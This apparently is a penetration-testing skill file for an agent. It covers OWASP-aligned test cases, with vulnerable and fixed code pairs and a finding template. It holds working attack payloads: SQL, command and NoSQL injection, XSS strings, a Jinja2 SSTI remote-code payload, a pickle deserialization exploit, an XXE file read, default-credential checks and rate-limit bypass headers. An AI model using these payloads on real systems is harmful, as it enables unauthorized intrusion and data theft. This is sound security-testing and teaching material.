---
name: penetration-testing
title: Penetration Testing & Vulnerability Discovery Patterns
description: Test case execution, OWASP Top 10 coverage, exploitation techniques, and finding reporting
compatibility: ["agent:penetration-test"]
metadata:
  domain: security
  maturity: production
  audience: [security-engineer, red-team, bug-bounty]
allowed-tools: [bash, curl, python, docker, git]
---

# Penetration Testing Skill

Comprehensive patterns for executing penetration tests aligned with OWASP standards, including reconnaissance, vulnerability discovery, exploitation, and reporting.

## Table of Contents

1. [Test Case Design](#test-case-design)
2. [OWASP Coverage Matrix](#owasp-coverage-matrix)
3. [Common Vulnerabilities & Exploitation](#common-vulnerabilities--exploitation)
4. [API Security Testing](#api-security-testing)
5. [Web Application Testing](#web-application-testing)
6. [Finding Template](#finding-template)
7. [Remediation Payloads](#remediation-payloads)

---

## Test Case Design

### General Pattern

```python
class PenetrationTest:
    def __init__(self, target_url, scope):
        self.target = target_url
        self.scope = scope  # e.g., ["example.com", "api.example.com"]
        self.findings = []
    
    def execute_test_case(self, test_name, attack_payload, validation_fn):
        """Execute a single test and validate for vulnerability."""
        try:
            response = self.send_request(attack_payload)
            if validation_fn(response):
                finding = self.create_finding(test_name, response)
                self.findings.append(finding)
                return True
        except Exception as e:
            self.log_error(f"Test {test_name} failed: {e}")
        return False
    
    def send_request(self, payload):
        """Send HTTP request with payload."""
        return requests.get(self.target, params=payload, timeout=10)
    
    def create_finding(self, test_name, response):
        """Create a finding object with context."""
        return {
            "test": test_name,
            "evidence": response.text[:500],
            "timestamp": datetime.now(),
            "cvss": None,  # To be calculated
        }
```

### Test Harness Example

```bash
#!/bin/bash
TARGET="https://target.example.com"
SCOPE_FILE="scope.txt"
FINDINGS_LOG="findings.log"

# Run OWASP Top 10 tests
echo "Starting penetration test on $TARGET"

# 1. Test authentication weaknesses
echo "Testing authentication..."
./tests/auth_tests.sh "$TARGET" >> "$FINDINGS_LOG"

# 2. Test authorization flaws
echo "Testing authorization..."
./tests/authz_tests.sh "$TARGET" >> "$FINDINGS_LOG"

# 3. Test input handling
echo "Testing input validation..."
./tests/input_tests.sh "$TARGET" >> "$FINDINGS_LOG"

# Summarize findings
echo "Findings summary:"
grep -c "CRITICAL" "$FINDINGS_LOG" && echo "Critical issues found"
```

---

## OWASP Coverage Matrix

### 1. Authentication & Session Management

**Test Cases:**
| Test | Payload | Validation |
|------|---------|-----------|
| Weak password policy | Register with `pass123` | Account created → finding |
| Session fixation | Capture session ID before login, use after login | Same ID → finding |
| Exposed credentials in URL | `?password=admin123` in referrer | Logged in history → finding |
| No password reset token expiry | Use old reset token after 30 days | Still works → finding |

**Execution:**
```bash
# Test password policy
curl -X POST https://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"123"}' \
  | grep -i "password too weak"

# If no error → weak policy found
```

### 2. Authorization & Access Control

**Test Cases:**
```yaml
Broken Object Level Authorization (BOLA):
  - Enumerate user IDs: /users/1, /users/2, /users/3
  - As User A, access User B's profile: /users/{user_b_id}/profile
  - If accessible without authorization check → finding

Privilege Escalation:
  - Login as regular user
  - Attempt admin endpoints: /admin/dashboard, /admin/users
  - If accessible or returns data → finding

Attribute-Based Access Control (ABAC):
  - Modify JWT claims locally (if not verified server-side)
  - Inject `"role":"admin"` into token
  - If server accepts → finding
```

**Implementation:**
```python
def test_bola(target_url, authenticated_session):
    """Test broken object-level authorization."""
    user_ids = [1, 2, 3, 4, 5]
    
    for uid in user_ids:
        response = authenticated_session.get(f"{target_url}/users/{uid}/profile")
        if response.status_code == 200:
            # Check if we can access other users' data
            data = response.json()
            if data.get("username") != get_current_username():
                return {
                    "vulnerability": "BOLA",
                    "endpoint": f"/users/{uid}/profile",
                    "accessible_user_ids": user_ids,
                    "severity": "HIGH",
                }
    return None
```

### 3. Injection Attacks

**SQL Injection:**
```bash
# Test SQLi in login form
curl -X POST https://target.com/login \
  -d "username=admin' --&password=anything"

# Check for SQL errors or unexpected response
```

**Command Injection:**
```bash
# Test RCE via parameter
curl "https://target.com/ping?host=google.com;whoami"

# Look for command output in response
```

**NoSQL Injection:**
```python
# Test against MongoDB/DynamoDB
payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
response = requests.post(
    "https://target.com/api/login",
    json=payload
)
# If login succeeds without credentials → finding
```

### 4. Cross-Site Scripting (XSS)

**Reflected XSS:**
```bash
# Test parameter injection
curl "https://target.com/search?q=<script>alert('XSS')</script>"

# Check if script is in response unescaped
```

**Stored XSS:**
```python
# 1. Store payload
requests.post("https://target.com/comments", 
    data={"comment": "<img src=x onerror=alert('XSS')>"})

# 2. Retrieve and check if executed
response = requests.get("https://target.com/comments")
if "<img src=x onerror=alert" in response.text:
    print("Stored XSS found")
```

### 5. Security Misconfiguration

**Debug/Admin Interfaces:**
```bash
# Check for common paths
PATHS=("/.git" "/.env" "/admin" "/debug" "/.well-known/acme-challenge")

for path in "${PATHS[@]}"; do
  curl -I "https://target.com$path"
done
```

**Default Credentials:**
```python
common_creds = [
    ("admin", "admin"),
    ("root", "password"),
    ("postgres", "postgres"),
]

for username, password in common_creds:
    response = requests.post(
        "https://target.com/api/login",
        json={"username": username, "password": password}
    )
    if response.status_code == 200:
        print(f"Default credentials found: {username}:{password}")
```

---

## Common Vulnerabilities & Exploitation

### A1: Server-Side Template Injection (SSTI)

**Detection:**
```python
payloads = [
    "{{ 7 * 7 }}",  # Jinja2
    "<%= 7 * 7 %>",  # ERB
    "#{7*7}",        # Groovy
]

for payload in payloads:
    response = requests.get(
        f"https://target.com/render?template={payload}"
    )
    if "49" in response.text:
        print("SSTI found!")
```

**Exploitation (Jinja2 RCE):**
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### A2: Insecure Deserialization

**Vulnerable Code Pattern:**
```python
import pickle

user_data = request.cookies.get("user")
obj = pickle.loads(user_data)  # Dangerous!
```

**Exploitation:**
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

malicious_payload = pickle.dumps(Exploit())
# Send as cookie
```

### A3: XXE (XML External Entity)

**Vulnerable Code:**
```python
import xml.etree.ElementTree as ET

xml_data = request.data
tree = ET.parse(xml_data)  # Vulnerable to XXE
```

**Exploitation:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Fix:** Use secure XML parser:
```python
import defusedxml.ElementTree as ET
tree = ET.parse(xml_data)  # Safe
```

---

## API Security Testing

### OAuth 2.0 Misconfigurations

**Test OIDC Redirect URI Validation:**
```bash
# Authorization endpoint with invalid redirect_uri
curl "https://auth.target.com/authorize?client_id=xyz&redirect_uri=https://attacker.com"

# If accepted → authorization code can be sent to attacker
```

**Test Token Revocation:**
```bash
ACCESS_TOKEN="eyJ..."
curl -X POST https://auth.target.com/revoke \
  -d "token=$ACCESS_TOKEN"

# Use token after revocation
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://api.target.com/me

# If still accepted → finding
```

### GraphQL Introspection

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name }
      }
    }
  }
}
```

**Test for Exposed Schema:**
```bash
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"..."}'  # IntrospectionQuery

# If returns schema → all fields/mutations exposed
```

### Rate Limiting Bypass

```python
def test_rate_limit_bypass(api_endpoint):
    """Test rate limit bypass via header manipulation."""
    
    bypass_headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "[127.0.0.1]",
        "X-Client-IP": "127.0.0.1",
    }
    
    for header_key, header_val in bypass_headers.items():
        for i in range(100):
            response = requests.post(
                api_endpoint,
                headers={header_key: header_val}
            )
            if response.status_code != 429:
                print(f"Rate limit bypass via {header_key}")
                return True
    return False
```

---

## Web Application Testing

### Cookie Security

**Test HttpOnly Flag:**
```python
# Parse Set-Cookie header
cookies = response.headers.getlist("Set-Cookie")
for cookie in cookies:
    if "HttpOnly" not in cookie:
        print(f"Missing HttpOnly: {cookie}")  # Finding
```

**Test Secure Flag:**
```bash
# Test on HTTP (non-HTTPS)
curl -H "Cookie: session=abc" http://target.com
# If cookie sent over HTTP → finding
```

### CORS Misconfiguration

**Test Wildcard CORS:**
```bash
curl -I -H "Origin: https://attacker.com" \
  https://target.com/api/data

# If response includes "Access-Control-Allow-Origin: *"
# → Any origin can access data → finding
```

---

## Finding Template

```yaml
Finding:
  ID: "PEN-2024-001"
  Title: "Broken Object Level Authorization in User Profile API"
  
  Severity: "HIGH"
  CVSS v3.1: "7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)"
  
  Description: |
    The /api/users/{id}/profile endpoint does not properly validate
    authorization, allowing an authenticated user to access any other
    user's profile by manipulating the user ID parameter.
  
  Reproduction Steps:
    1. Authenticate as User A
    2. GET /api/users/1/profile (own profile) → 200, returns own data
    3. GET /api/users/999/profile (other user) → 200, returns other user's data
    4. Cross-reference with User B's email to confirm data leakage
  
  Impact: |
    An attacker can enumerate and access sensitive user data including:
    - Email addresses, phone numbers
    - Payment information
    - Activity history
  
  Remediation:
    Implement proper authorization checks:
    
    ```python
    @app.route("/api/users/<int:user_id>/profile")
    def get_user_profile(user_id):
        current_user = get_current_user()
        if current_user.id != user_id:
            abort(403)  # Forbidden
        return get_profile(user_id)
    ```
  
  Evidence: |
    Request: GET /api/users/42/profile
    Response: {"id": 42, "email": "other-user@example.com", ...}
    
    Request: GET /api/users/43/profile
    Response: {"id": 43, "email": "another-user@example.com", ...}
  
  Reference:
    - OWASP: https://owasp.org/API1_2023-Broken_Object_Level_Authorization/
    - CWE-639: Authorization Bypass Through User-Controlled Key
```

---

## Remediation Payloads

### SQL Injection Fix

**Vulnerable:**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Secure:**
```python
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))  # Parameterized query
```

### XSS Prevention

**Vulnerable:**
```html
<div>{{ user_input }}</div>
```

**Secure:**
```html
<div>{{ user_input | escape }}</div>
<!-- Or use Content Security Policy -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### CORS Fix

**Vulnerable:**
```python
@app.route("/api/data")
def get_data():
    response = make_response(data)
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response
```

**Secure:**
```python
ALLOWED_ORIGINS = ["https://trusted-domain.com"]

@app.route("/api/data")
def get_data():
    origin = request.headers.get("Origin")
    if origin in ALLOWED_ORIGINS:
        response = make_response(data)
        response.headers["Access-Control-Allow-Origin"] = origin
    else:
        abort(403)
    return response
```

---

## References

- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document)
- [CWE Top 25](https://cwe.mitre.org/top25/)
